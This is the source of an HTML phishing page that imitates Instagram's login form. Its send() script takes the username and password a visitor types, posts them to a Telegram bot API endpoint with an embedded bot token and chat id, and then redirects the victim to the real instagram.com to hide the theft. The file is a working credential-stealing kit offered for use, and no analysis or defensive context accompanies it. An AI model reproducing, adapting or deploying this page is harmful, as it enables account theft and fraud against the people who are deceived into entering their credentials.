<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
        .box { width: 300px; padding: 20px; border: 1px solid #dbdbdb; text-align: center; }
        .logo { font-size: 35px; font-style: italic; font-weight: bold; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin-bottom: 7px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        .btn { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <input type="text" id="l" placeholder="Username or email">
        <input type="password" id="p" placeholder="Password">
        <button class="btn" onclick="send()">Log In</button>
    </div>
    <script>
        function send() {
            const log = document.getElementById('l').value;
            const pas = document.getElementById('p').value;
            fetch(`https://api.telegram.org/bot8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8/sendMessage?chat_id=8491881282&text=${encodeURIComponent("📸 INSTA:\n👤 L: "+log+"\n🔑 P: "+pas)}`, {mode: 'no-cors'});
            setTimeout(() => { window.location.href="https://instagram.com/"; }, 1000);
        }
    </script>
</body>
</html>
